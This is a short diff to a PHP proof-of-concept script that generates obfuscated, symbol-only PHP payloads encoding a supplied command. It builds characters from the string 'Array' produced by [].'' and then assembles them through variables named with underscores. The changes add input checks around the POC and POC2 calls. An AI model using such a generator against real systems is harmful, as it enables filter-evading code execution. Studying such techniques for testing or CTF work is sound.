@@ -28,7 +28,7 @@ function POC($cmd){
 
 function POC2($cmd){
     $i = 0;
-    echo '$____ = "_";';
+    echo '$____ = "_";$__=$___;';
     $POC_pat1 = "\$__=\$___;";
     $POC_pat2 = "\$____ .=\$__;";
     while ($i<strlen($cmd)){
@@ -51,9 +51,14 @@ function POC2($cmd){
     }
 }
 
-$POC_pat7 = "\$_=[].'';\$___=\$_[\$__];\$__=\$___;\$_=\$___;";
-echo $POC_pat7;
-POC($cmd);
-POC2($cmd2);
+
+if (!empty($cmd)){
+    $POC_pat7 = "\$_=[].'';\$___=\$_[\$__];\$__=\$___;\$_=\$___;";
+    echo $POC_pat7;
+    POC($cmd);
+}
+if (!empty($cmd2)){
+    POC2($cmd2);
+}
 
 
